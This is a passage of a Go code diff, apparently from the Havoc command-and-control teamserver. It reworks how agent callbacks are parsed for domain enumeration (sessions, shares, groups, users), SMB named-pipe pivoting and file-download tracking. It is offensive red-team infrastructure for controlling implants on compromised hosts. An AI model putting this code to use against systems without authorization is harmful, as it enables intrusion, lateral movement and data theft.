-						User   = string(Parser.ParseBytes())
-						Time   = int(Parser.ParseInt32())
-						Idle   = int(Parser.ParseInt32())
-						Column []string
-					)
+						Index++
 
-					Index++
+						Column = []string{Client, User, strconv.Itoa(Time), strconv.Itoa(Idle)}
+						Data = append(Data, Column)
+					}
 
-					Column = []string{Client, User, strconv.Itoa(Time), strconv.Itoa(Idle)}
-					Data = append(Data, Column)
+					table.AppendBulk(Data)
+					table.Render()
+
+					Message["Type"] = "Info"
+					Message["Message"] = fmt.Sprintf("Sessions for %v [%v]: ", Domain, Index)
+					Message["Output"] = "\n" + Buffer.String()
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_SESSIONS, Invalid packet", AgentID))
 				}
 
-				table.AppendBulk(Data)
-				table.Render()
+				break
 
-				Message["Type"] = "Info"
-				Message["Message"] = fmt.Sprintf("Sessions for %v [%v]: ", Domain, Index)
-				Message["Output"] = "\n" + Buffer.String()
-			}
-			break
+			case DEMON_NET_COMMAND_COMPUTER:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_COMPUTER", AgentID))
+				a.RequestCompleted(RequestID)
+				break
 
-		case DEMON_NET_COMMAND_COMPUTER:
-			break
+			case DEMON_NET_COMMAND_DCLIST:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_DCLIST", AgentID))
+				a.RequestCompleted(RequestID)
+				break
 
-		case DEMON_NET_COMMAND_DCLIST:
-			break
+			case DEMON_NET_COMMAND_SHARE:
+				var (
+					Index  int
+					Buffer bytes.Buffer
+					Data   [][]string
+				)
 
-		case DEMON_NET_COMMAND_SHARE:
-			var (
-				Index  int
-				Buffer bytes.Buffer
-				Data   [][]string
-			)
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_SHARE", AgentID))
 
-			if Parser.Length() > 0 {
-				var Domain = common.DecodeUTF16(Parser.ParseBytes())
+					var Domain = Parser.ParseUTF16String()
 
-				table := tablewriter.NewWriter(&Buffer)
+					table := tablewriter.NewWriter(&Buffer)
 
-				table.SetBorder(false)
-				table.SetHeader([]string{"Share name", "Path", "Remark", "Access"})
-				table.SetBorder(false)
-				table.SetHeaderAlignment(tablewriter.ALIGN_CENTER)
+					table.SetBorder(false)
+					table.SetHeader([]string{"Share name", "Path", "Remark", "Access"})
+					table.SetBorder(false)
+					table.SetHeaderAlignment(tablewriter.ALIGN_CENTER)
 
-				// table.SetRowSeparator("-")
-				table.SetColumnSeparator(" ")
-				table.SetCenterSeparator(" ")
+					// table.SetRowSeparator("-")
+					table.SetColumnSeparator(" ")
+					table.SetCenterSeparator(" ")
 
-				for Parser.Length() != 0 {
-					var (
-						Name   = common.DecodeUTF16(Parser.ParseBytes())
-						Path   = common.DecodeUTF16(Parser.ParseBytes())
-						Remark = common.DecodeUTF16(Parser.ParseBytes())
-						Access = int(Parser.ParseInt32())
+					for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadInt32}) {
+						var (
+							Name   = Parser.ParseUTF16String()
+							Path   = Parser.ParseUTF16String()
+							Remark = Parser.ParseUTF16String()
+							Access = int(Parser.ParseInt32())
 
-						Column []string
-					)
+							Column []string
+						)
 
-					Index++
+						Index++
 
-					Column = []string{Name, Path, Remark, strconv.Itoa(Access)}
-					Data = append(Data, Column)
+						Column = []string{Name, Path, Remark, strconv.Itoa(Access)}
+						Data = append(Data, Column)
+					}
+
+					table.AppendBulk(Data)
+					table.Render()
+
+					Message["Type"] = "Info"
+					Message["Message"] = fmt.Sprintf("Shares for %v [%v]: ", Domain, Index)
+					Message["Output"] = "\n" + Buffer.String()
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_SHARE, Invalid packet", AgentID))
 				}
 
-				table.AppendBulk(Data)
-				table.Render()
+				break
 
-				Message["Type"] = "Info"
-				Message["Message"] = fmt.Sprintf("Shares for %v [%v]: ", Domain, Index)
-				Message["Output"] = "\n" + Buffer.String()
-			}
-			break
+			case DEMON_NET_COMMAND_LOCALGROUP:
+				var Data string
 
-		case DEMON_NET_COMMAND_LOCALGROUP:
-			var Data string
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_LOCALGROUP", AgentID))
 
-			if Parser.Length() > 0 {
-				var Domain = common.DecodeUTF16(Parser.ParseBytes())
+					var Domain = Parser.ParseUTF16String()
 
-				Data += fmt.Sprintf(" %-48s %s\n", "Group", "Description")
-				Data += fmt.Sprintf(" %-48s %s\n", "-----", "-----------")
-
-				for Parser.Length() != 0 {
-					var (
-						Group       = string(Parser.ParseBytes())
-						Description = string(Parser.ParseBytes())
-					)
-
-					Data += fmt.Sprintf(" %-48s  %s\n", Group, Description)
-				}
-
-				Message["Type"] = "Info"
-				Message["Message"] = fmt.Sprintf("Local Groups for %v: ", Domain)
-				Message["Output"] = "\n" + Data
-			}
-			break
-
-		case DEMON_NET_COMMAND_GROUP:
-			var Data string
-
-			if Parser.Length() > 0 {
-				var Domain = string(Parser.ParseBytes())
-
-				if Parser.Length() > 0 {
 					Data += fmt.Sprintf(" %-48s %s\n", "Group", "Description")
 					Data += fmt.Sprintf(" %-48s %s\n", "-----", "-----------")
 
-					for Parser.Length() != 0 {
+					for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes}) {
 						var (
-							Group       = string(Parser.ParseBytes())
-							Description = string(Parser.ParseBytes())
+							Group       = Parser.ParseUTF16String()
+							Description = Parser.ParseUTF16String()
 						)
 
 						Data += fmt.Sprintf(" %-48s  %s\n", Group, Description)
 					}
+
+					Message["Type"] = "Info"
+					Message["Message"] = fmt.Sprintf("Local Groups for %v: ", Domain)
+					Message["Output"] = "\n" + Data
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_LOCALGROUP, Invalid packet", AgentID))
 				}
+				break
 
-				Message["Type"] = "Info"
-				Message["Message"] = fmt.Sprintf("List groups on %v: ", Domain)
-				Message["Output"] = "\n" + Data
-			}
-			break
+			case DEMON_NET_COMMAND_GROUP:
+				var Data string
 
-		case DEMON_NET_COMMAND_USERS:
-			var Data string
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_GROUP", AgentID))
+					var Domain = Parser.ParseUTF16String()
 
-			if Parser.Length() > 0 {
-				var Target = string(Parser.ParseBytes())
+					Data += fmt.Sprintf(" %-48s %s\n", "Group", "Description")
+					Data += fmt.Sprintf(" %-48s %s\n", "-----", "-----------")
 
-				for Parser.Length() != 0 {
-					var (
-						User  = string(Parser.ParseBytes())
-						Admin = Parser.ParseInt32()
-					)
+					for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes}) {
+						var (
+							Group       = Parser.ParseUTF16String()
+							Description = Parser.ParseUTF16String()
+						)
 
-					if Admin == win32.TRUE {
-						Data += fmt.Sprintf(" - %s (Admin)\n", User)
-					} else {
-						Data += fmt.Sprintf(" - %s \n", User)
+						Data += fmt.Sprintf(" %-48s  %s\n", Group, Description)
 					}
+
+					Message["Type"] = "Info"
+					Message["Message"] = fmt.Sprintf("List groups on %s: ", Domain)
+					Message["Output"] = "\n" + Data
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_GROUP, Invalid packet", AgentID))
 				}
 
-				Message["Type"] = "Info"
-				Message["Message"] = fmt.Sprintf("Users on %v: ", Target)
-				Message["Output"] = "\n" + Data
-			}
-			break
-		}
+				break
 
-		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+			case DEMON_NET_COMMAND_USERS:
+				var Data string
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_USERS", AgentID))
+					var Target = Parser.ParseUTF16String()
+
+					for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32}) {
+						var (
+							User  = Parser.ParseUTF16String()
+							Admin = Parser.ParseInt32()
+						)
+
+						if Admin == win32.TRUE {
+							Data += fmt.Sprintf(" - %s (Admin)\n", User)
+						} else {
+							Data += fmt.Sprintf(" - %s \n", User)
+						}
+					}
+
+					Message["Type"] = "Info"
+					Message["Message"] = fmt.Sprintf("Users on %v: ", Target)
+					Message["Output"] = "\n" + Data
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_USERS, Invalid packet", AgentID))
+				}
+
+				break
+
+			default:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - UNKNOWN (%d)", AgentID, NetCommand))
+			}
+
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET, Invalid packet", AgentID))
+		}
 
 		break
 
 	case COMMAND_PIVOT:
-		var (
-			PivotCommand = Parser.ParseInt32()
-			Message      = make(map[string]string)
-		)
 
-		switch PivotCommand {
-		case DEMON_PIVOT_LIST:
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
 			var (
-				Data  string
-				Count int
+				PivotCommand = Parser.ParseInt32()
+				Message      = make(map[string]string)
 			)
 
-			Data += fmt.Sprintf(" %-10s %s\n", "DemonID ", "Named Pipe")
-			Data += fmt.Sprintf(" %-10s %s\n", "--------", "-----------")
-
-			for Parser.Length() != 0 {
+			switch PivotCommand {
+			case DEMON_PIVOT_LIST:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_LIST", AgentID))
 				var (
-					DemonId   int
-					NamedPipe string
+					Data  string
+					Count int
 				)
 
-				if Parser.Length() > 4 {
+				Data += fmt.Sprintf(" %-10s %s\n", "DemonID ", "Named Pipe")
+				Data += fmt.Sprintf(" %-10s %s\n", "--------", "-----------")
+
+				for Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes}) {
+					var (
+						DemonId   int
+						NamedPipe string
+					)
+
 					DemonId = Parser.ParseInt32()
+					NamedPipe = Parser.ParseUTF16String()
+
+					Data += fmt.Sprintf(" %-10x  %v\n", DemonId, NamedPipe)
+					Count++
 				}
 
-				if Parser.Length() > 4 {
-					NamedPipe = string(Parser.ParseBytes())
+				if Count > 0 {
+					Message["Type"] = "Info"
+					Message["Message"] = fmt.Sprintf("Pivot List [%v]: ", Count)
+					Message["Output"] = "\n" + Data
+				} else {
+					Message["Type"] = "Info"
+					Message["Message"] = fmt.Sprintf("No pivots connected")
+				}
+				a.RequestCompleted(RequestID)
+
+			case DEMON_PIVOT_SMB_CONNECT:
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+					var Success = Parser.ParseInt32()
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_CONNECT, Success: %d", AgentID, Success))
+
+					// if we successfully connected to the SMB named pipe
+					if Success == 1 {
+
+						if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+
+							var (
+								DemonData = Parser.ParseBytes()
+								AgentHdr  Header
+								err       error
+							)
+
+							// parse the agent header
+							if AgentHdr, err = ParseHeader(DemonData); err == nil {
+
+								if AgentHdr.MagicValue == DEMON_MAGIC_VALUE {
+									// ignore the RequestID
+									AgentHdr.Data.ParseInt32()
+									// ignore the CommandID
+									AgentHdr.Data.ParseInt32()
+
+									var DemonInfo *Agent
+
+									// if agent exist then just retrieve the instance by agent id
+									if teamserver.AgentExist(AgentHdr.AgentID) {
+
+										DemonInfo = teamserver.AgentInstance(AgentHdr.AgentID)
+										Message["MiscType"] = "reconnect"
+										Message["MiscData"] = fmt.Sprintf("%v;%x", a.NameID, AgentHdr.AgentID)
+
+										if DemonInfo.Pivots.Parent == nil {
+											//logger.Warn(fmt.Sprintf("SMB agent [%x] does not have a Parent!", AgentHdr.AgentID))
+											DemonInfo.Pivots.Parent = a
+										}
+
+										for i := range DemonInfo.Pivots.Parent.Pivots.Links {
+											if DemonInfo.Pivots.Parent.Pivots.Links[i].NameID == fmt.Sprintf("%x", AgentHdr.AgentID) {
+												DemonInfo.Pivots.Parent.Pivots.Links = append(DemonInfo.Pivots.Parent.Pivots.Links[:i], DemonInfo.Pivots.Parent.Pivots.Links[i+1:]...)
+												break
+											}
+										}
+
+										DemonInfo.Pivots.Parent = a
+
+										a.Pivots.Links = append(a.Pivots.Links, DemonInfo)
+										teamserver.LinkAdd(a, DemonInfo)
+
+									} else {
+										// if the agent doesn't exist then we assume that it's a register request from a new agent
+
+										DemonInfo = ParseDemonRegisterRequest(AgentHdr.AgentID, AgentHdr.Data, "")
+										DemonInfo.Pivots.Parent = a
+
+										a.Pivots.Links = append(a.Pivots.Links, DemonInfo)
+										teamserver.LinkAdd(a, DemonInfo)
+
+										DemonInfo.Info.MagicValue = AgentHdr.MagicValue
+
+										teamserver.AgentAdd(DemonInfo)
+										teamserver.AgentSendNotify(DemonInfo)
+
+										// start a goroutine that updates the GUI last callback time each second.
+										go DemonInfo.BackgroundUpdateLastCallbackUI(teamserver)
+									}
+
+									if DemonInfo != nil {
+										Message["Type"] = "Good"
+										Message["Message"] = "[SMB] Connected to pivot agent [" + a.NameID + "]-<>-<>-[" + DemonInfo.NameID + "]"
+									} else {
+										Message["Type"] = "Error"
+										Message["Message"] = "[SMB] Failed to connect: failed to parse the agent"
+									}
+
+								} else {
+									Message["Type"] = "Error"
+									Message["Message"] = "[SMB] Failed to connect: magic value isn't demon type"
+								}
+
+							} else {
+								Message["Type"] = "Error"
+								Message["Message"] = "[SMB] Failed to connect: " + err.Error()
+							}
+						} else {
+							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_CONNECT, Invalid packet", AgentID))
+							Message["Type"] = "Error"
+							Message["Message"] = "[SMB] Failed to connect: Invalid response"
+						}
+					} else {
+						if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+							logger.Debug("DEMON_PIVOT_SMB_CONNECT: Failed")
+							var (
+								ErrorCode          = Parser.ParseInt32()
+								ErrorString, found = Win32ErrorCodes[ErrorCode]
+							)
+
+							ErrorString += " "
+
+							if !found {
+								ErrorString = ""
+							}
+
+							Message["Type"] = "Error"
+							Message["Message"] = fmt.Sprintf("[SMB] Failed to connect: %v [%v]", ErrorString, ErrorCode)
+						} else {
+							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_CONNECT, Invalid packet", AgentID))
+						}
+					}
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_CONNECT, Invalid packet", AgentID))
 				}
 
-				Data += fmt.Sprintf(" %-10x  %s\n", DemonId, NamedPipe)
-				Count++
-			}
+				break
 
-			if Count > 0 {
-				Message["Type"] = "Info"
-				Message["Message"] = fmt.Sprintf("Pivot List [%v]: ", Count)
-				Message["Output"] = "\n" + Data
-			} else {
-				Message["Type"] = "Error"
-				Message["Message"] = fmt.Sprintf("No pivots connected")
-			}
+			case DEMON_PIVOT_SMB_DISCONNECT:
 
-		case AGENT_PIVOT_SMB_CONNECT:
-			var Success = Parser.ParseInt32()
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
+					var (
+						Success = Parser.ParseInt32()
+						AgentID = Parser.ParseInt32()
+					)
 
-			if Success == 1 {
-				if Parser.Length() > 0 {
-					var DemonData = Parser.ParseBytes()
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_DISCONNECT, Success: %d, AgentID: %x", AgentID, Success, AgentID))
 
-					var AgentHdr, err = AgentParseHeader(DemonData)
+					if Success == win32.TRUE {
+						Message["Type"] = "Info"
+						Message["Message"] = fmt.Sprintf("[SMB] Agent disconnected %x", AgentID)
+
+						Message["MiscType"] = "disconnect"
+						Message["MiscData"] = fmt.Sprintf("%x", AgentID)
+
+						AgentInstance := teamserver.AgentInstance(AgentID)
+						if AgentInstance != nil {
+							AgentInstance.Active = false
+							AgentInstance.Reason = "Disconnected"
+						}
+
+						for i := range a.Pivots.Links {
+							if a.Pivots.Links[i].NameID == Message["MiscData"] {
+								teamserver.LinkRemove(a, a.Pivots.Links[i])
+								a.Pivots.Links = append(a.Pivots.Links[:i], a.Pivots.Links[i+1:]...)
+								break
+							}
+						}
+					} else {
+						Message["Type"] = "Error"
+						Message["Message"] = fmt.Sprintf("[SMB] Failed to disconnect agent %x", AgentID)
+					}
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_DISCONNECT, Invalid packet", AgentID))
+				}
+
+				break
+
+			case DEMON_PIVOT_SMB_COMMAND:
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+					var (
+						Package       = Parser.ParseBytes()
+						AgentHdr, err = ParseHeader(Package)
+					)
+
 					if err == nil {
 
 						if AgentHdr.MagicValue == DEMON_MAGIC_VALUE {
-							AgentHdr.Data.ParseInt32()
+							var Request    = AgentHdr.Data.ParseInt32()
+							var Command    = AgentHdr.Data.ParseInt32()
+							var PivotAgent *Agent
 
-							var DemonInfo *Agent
-
-							if teamserver.AgentExist(AgentHdr.AgentID) {
-								DemonInfo = teamserver.AgentInstance(AgentHdr.AgentID)
-								Message["MiscType"] = "reconnect"
-								Message["MiscData"] = fmt.Sprintf("%v;%x", a.NameID, AgentHdr.AgentID)
-
-								for i := range DemonInfo.Pivots.Parent.Pivots.Links {
-									if DemonInfo.Pivots.Parent.Pivots.Links[i].NameID == fmt.Sprintf("%x", AgentHdr.AgentID) {
-										DemonInfo.Pivots.Parent.Pivots.Links = append(DemonInfo.Pivots.Parent.Pivots.Links[:i], DemonInfo.Pivots.Parent.Pivots.Links[i+1:]...)
-										break
-									}
-								}
-
-								DemonInfo.Pivots.Parent = a
-
-								a.Pivots.Links = append(a.Pivots.Links, DemonInfo)
-
-							} else {
-								DemonInfo = ParseResponse(AgentHdr.AgentID, AgentHdr.Data)
-								DemonInfo.Pivots.Parent = a
-
-								a.Pivots.Links = append(a.Pivots.Links, DemonInfo)
-
-								DemonInfo.Info.MagicValue = AgentHdr.MagicValue
-
-								teamserver.AgentAdd(DemonInfo)
-								teamserver.AgentSendNotify(DemonInfo)
-
-								go DemonInfo.BackgroundUpdateLastCallbackUI(teamserver)
-							}
-
-							if DemonInfo != nil {
-								Message["Type"] = "Good"
-								Message["Message"] = "[SMB] Connected to pivot agent [" + a.NameID + "]-<>-<>-[" + DemonInfo.NameID + "]"
+							PivotAgent = teamserver.AgentInstance(AgentHdr.AgentID)
+							if PivotAgent != nil {
+								//logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_COMMAND, Linked Agent: %s, Command: %d", AgentID, PivotAgent.NameID, Command))
+								PivotAgent.TaskDispatch(uint32(Request), uint32(Command), AgentHdr.Data, teamserver)
 							} else {
 								Message["Type"] = "Error"
-								Message["Message"] = "[SMB] Failed to connect: failed to parse the agent"
+								Message["Message"] = fmt.Sprintf("Can't process output for %x: Agent not found", AgentHdr.AgentID)
 							}
 
 						} else {
 							Message["Type"] = "Error"
-							Message["Message"] = "[SMB] Failed to connect: magic value isn't demon type"
+							Message["Message"] = "[SMB] Response magic value isn't demon type"
 						}
-
 					} else {
 						Message["Type"] = "Error"
-						Message["Message"] = "[SMB] Failed to connect: " + err.Error()
+						Message["Message"] = "[SMB] Failed to parse agent header: " + err.Error()
 					}
 				} else {
-					Message["Type"] = "Error"
-					Message["Message"] = "[SMB] Failed to connect: Invalid response"
-				}
-			} else {
-				logger.Debug("AGENT_PIVOT_SMB_CONNECT: Failed")
-				var (
-					ErrorCode          = Parser.ParseInt32()
-					ErrorString, found = Win32ErrorCodes[ErrorCode]
-				)
-
-				ErrorString += " "
-
-				if !found {
-					ErrorString = ""
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_COMMAND, Invalid packet", AgentID))
 				}
 
-				Message["Type"] = "Error"
-				Message["Message"] = fmt.Sprintf("[SMB] Failed to connect: %v [%v]", ErrorString, ErrorCode)
+				break
+
+			default:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - UNKNOWN (%d)", AgentID, PivotCommand))
 			}
 
-			break
-
-		case AGENT_PIVOT_SMB_DISCONNECT:
-
-			if Parser.Length() > 0 {
-				var (
-					Success = Parser.ParseInt32()
-					AgentID = Parser.ParseInt32()
-				)
-
-				if Success == win32.TRUE {
-					Message["Type"] = "Error"
-					Message["Message"] = fmt.Sprintf("[SMB] Agent disconnected %x", AgentID)
-
-					Message["MiscType"] = "disconnect"
-					Message["MiscData"] = fmt.Sprintf("%x", AgentID)
-
-					AgentInstance := teamserver.AgentInstance(AgentID)
-					if AgentInstance != nil {
-						AgentInstance.Active = false
-						AgentInstance.Reason = "Disconnected"
-					}
-
-					for i := range a.Pivots.Links {
-						if a.Pivots.Links[i].NameID == Message["MiscData"] {
-							a.Pivots.Links = append(a.Pivots.Links[:i], a.Pivots.Links[i+1:]...)
-							break
-						}
-					}
-				} else {
-					Message["Type"] = "Error"
-					Message["Message"] = fmt.Sprintf("[SMB] Failed to disconnect agent %x", AgentID)
-				}
-			}
-
-			break
-
-		case AGENT_PIVOT_SMB_COMMAND:
-
-			if Parser.Length() > 0 {
-				var (
-					Package       = Parser.ParseBytes()
-					AgentHdr, err = AgentParseHeader(Package)
-				)
-
-				if err == nil {
-
-					if AgentHdr.MagicValue == DEMON_MAGIC_VALUE {
-						var Command = AgentHdr.Data.ParseInt32()
-
-						found := false
-						for i := range a.Pivots.Links {
-							if a.Pivots.Links[i].NameID == utils.IntToHexString(AgentHdr.AgentID) {
-								a.Pivots.Links[i].TaskDispatch(Command, AgentHdr.Data, teamserver)
-								found = true
-								break
-							}
-						}
-
-						if !found {
-							Message["Type"] = "Error"
-							Message["Message"] = fmt.Sprintf("Can't process output for %x: Agent not found", AgentHdr.AgentID)
-						}
-
-					} else {
-						Message["Type"] = "Error"
-						Message["Message"] = "[SMB] Response magic value isn't demon type"
-					}
-				} else {
-					Message["Type"] = "Error"
-					Message["Message"] = "[SMB] Failed to parse agent header: " + err.Error()
-				}
-			}
-
-			break
-
-		default:
-			logger.Debug(fmt.Sprintf("CommandID not found: %x", CommandID))
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT, Invalid packet", AgentID))
 		}
-
-		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
 	case COMMAND_TRANSFER:
 
-		var (
-			SubCommand = Parser.ParseInt32()
-			Message    map[string]string
-		)
-
-		switch SubCommand {
-
-		case 0x0: /* transfer list */
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
 			var (
-				Data  string
-				Count int
+				SubCommand = Parser.ParseInt32()
+				Message    map[string]string
 			)
 
-			Data += fmt.Sprintf(" %-8s  %-8s  %-8s  %-8s %s\n", "File ID", "Size", "Progress", "State", "File")
-			Data += fmt.Sprintf(" %-8s  %-8s  %-8s  %-8s %s\n", "-------", "----", "--------", "-----", "----")
+			switch SubCommand {
 
-			for Parser.Length() >= 12 {
+			case DEMON_COMMAND_TRANSFER_LIST:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TRANSFER - DEMON_COMMAND_TRANSFER_LIST", AgentID))
 				var (
-					FileID = Parser.ParseInt32()
-					Size   = Parser.ParseInt32()
-					State  = Parser.ParseInt32()
+					Data  string
+					Count int
 				)
 
-				if download := a.DownloadGet(FileID); download != nil {
+				Data += fmt.Sprintf(" %-8s  %-8s  %-8s  %-8s %s\n", "File ID", "Size", "Progress", "State", "File")
+				Data += fmt.Sprintf(" %-8s  %-8s  %-8s  %-8s %s\n", "-------", "----", "--------", "-----", "----")
+
+				for Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
 					var (
-						StateString string
-						Progress    string
+						FileID = Parser.ParseInt32()
+						Size   = Parser.ParseInt32()
+						State  = Parser.ParseInt32()
 					)
 
-					if State == DOWNLOAD_STATE_RUNNING {
-						StateString = "Running"
-					} else if State == DOWNLOAD_STATE_STOPPED {
-						StateString = "Stopped"
-					} else if State == DOWNLOAD_STATE_REMOVE {
-						/* pending remove */
-						StateString = "Removed"
-					}
-
-					Progress = fmt.Sprintf("%.2f%%", common.PercentageChange(Size, download.TotalSize))
-					Data += fmt.Sprintf(" %-8x  %-8s  %-8s  %-8s %s\n", FileID, common.ByteCountSI(int64(download.TotalSize)), Progress, StateString, download.FilePath)
-					Count++
-				}
-			}
-
-			Message = map[string]string{
-				"Type":    "Info",
-				"Message": fmt.Sprintf("List downloads [%v current downloads]:", Count),
-				"Output":  "\n" + Data,
-			}
-
-			break
-
-		case 0x1: /* transfer stop */
-
-			if Parser.Length() >= 8 {
-				var (
-					Found  = Parser.ParseInt32()
-					FileID = Parser.ParseInt32()
-				)
-
-				if Found == win32.TRUE {
 					if download := a.DownloadGet(FileID); download != nil {
-						Message = map[string]string{
-							"Type":    "Good",
-							"Message": fmt.Sprintf("Successful found and stopped download: %x", FileID),
+						var (
+							StateString string
+							Progress    string
+						)
+
+						if State == DOWNLOAD_STATE_RUNNING {
+							StateString = "Running"
+						} else if State == DOWNLOAD_STATE_STOPPED {
+							StateString = "Stopped"
+						} else if State == DOWNLOAD_STATE_REMOVE {
+							/* pending remove */
+							StateString = "Removed"
+						}
+
+						Progress = fmt.Sprintf("%.2f%%", common.PercentageChange(Size, download.TotalSize))
+						Data += fmt.Sprintf(" %-8x  %-8s  %-8s  %-8s %s\n", FileID, common.ByteCountSI(int64(download.TotalSize)), Progress, StateString, download.FilePath)
+						Count++
+					}
+				}
+
+				Message = map[string]string{
+					"Type":    "Info",
+					"Message": fmt.Sprintf("List downloads [%v current downloads]:", Count),
+					"Output":  "\n" + Data,
+				}
+				a.RequestCompleted(RequestID)
+				break
+
+			case DEMON_COMMAND_TRANSFER_STOP:
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
+					var (
+						Found  = Parser.ParseInt32()
+						FileID = Parser.ParseInt32()
+					)
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TRANSFER - DEMON_COMMAND_TRANSFER_STOP, Found: %d, FileID: %x", AgentID, Found, FileID))
+
+					if Found == win32.TRUE {
+						if download := a.DownloadGet(FileID); download != nil {
+							Message = map[string]string{
+								"Type":    "Good",
+								"Message": fmt.Sprintf("Successful found and stopped download: %x", FileID),
+							}
+						} else {
+							Message = map[string]string{
+								"Type":    "Error",
+								"Message": fmt.Sprintf("Couldn't stop download %x: Download does not exists", FileID),
+							}
 						}
 					} else {
 						Message = map[string]string{
 							"Type":    "Error",
-							"Message": fmt.Sprintf("Couldn't stop download %x: Download does not exists", FileID),
+							"Message": fmt.Sprintf("Couldn't stop download %x: FileID not found", FileID),
 						}
 					}
+
 				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TRANSFER - DEMON_COMMAND_TRANSFER_STOP, Invalid packet", AgentID))
 					Message = map[string]string{
 						"Type":    "Error",
-						"Message": fmt.Sprintf("Couldn't stop download %x: FileID not found", FileID),
+						"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_TRANSFER with subcommand 0x1 (stop). Expected at least 8 bytes but received %v bytes", Parser.Length()),
 					}
 				}
+				a.RequestCompleted(RequestID)
+				break
 
-			} else {
-				Message = map[string]string{
-					"Type":    "Error",
-					"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_TRANSFER with subcommand 0x1 (stop). Expected at least 8 bytes but received %v bytes", Parser.Length()),
-				}
-			}
+			case DEMON_COMMAND_TRANSFER_RESUME:
 
-			break
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
+					var (
+						Found  = Parser.ParseInt32()
+						FileID = Parser.ParseInt32()
+					)
 
-		case 0x2: /* transfer resume */
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TRANSFER - DEMON_COMMAND_TRANSFER_RESUME, Found: %d, FileID: %x", AgentID, Found, FileID))
 
-			if Parser.Length() >= 8 {
-				var (
-					Found  = Parser.ParseInt32()
-					FileID = Parser.ParseInt32()
-				)
-
-				if Found == win32.TRUE {
-					if download := a.DownloadGet(FileID); download != nil {
-						Message = map[string]string{
-							"Type":    "Good",
-							"Message": fmt.Sprintf("Successful found and resumed download: %x", FileID),
+					if Found == win32.TRUE {
+						if download := a.DownloadGet(FileID); download != nil {
+							Message = map[string]string{
+								"Type":    "Good",
+								"Message": fmt.Sprintf("Successful found and resumed download: %x", FileID),
+							}
+						} else {
+							Message = map[string]string{
